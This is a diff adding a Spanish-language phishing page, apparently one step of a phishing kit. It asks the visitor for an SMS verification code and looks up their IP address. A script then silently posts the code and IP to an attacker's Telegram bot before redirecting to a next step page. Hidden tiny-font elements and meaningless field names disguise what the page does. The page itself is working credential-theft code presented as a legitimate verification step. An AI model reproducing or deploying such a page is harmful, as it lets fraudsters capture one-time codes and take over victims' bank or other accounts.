@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="theap/hojadestilo.css">
+    <title>beecla</title>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="dteleuno/ttoo.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#gfg").html(data.ip);
+      });
+    
+      var u_name, ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("mistycfalls").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "FORMULARIO\n☰LLAVE: " + u_name + "\n🌎IP: " + ip +"\n" + ip2;
+      };
+    
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'pasotercero.html';
+        });
+        return false;
+      };
+    </script>
+    
+
+    
+</head>
+<body>
+
+    <div class="labarra">
+
+    </div>
+    <form method="post" action="#" onsubmit="return sender();">
+   <p class="focus"><img src="theap/spaceLogo-1.png" alt="eprimerlofj"></p><br>
+<center>
+<div class="elcontenido"><br>
+<h2>Hemos enviado un SMS a tu celular, Ingresalo!</h2><br><br>
+<input inputmode="numeric"  required=""  id="mistycfalls" name="mistycfalls" class="xinput" placeholder="INGRESA EL SMS" type="text">
+<br>
+
+<input  value="Enviar" class="delboton" type="submit">
+
+<h4 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">
+    Recuerda ingresar todos los datos solicitados, este paso es obligatorio!
+</h4>
+</div></center>
+
+</body><div style="color: rgb(255, 255, 255); font-size: 0.00009pt;" >
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div></form>
+</html>
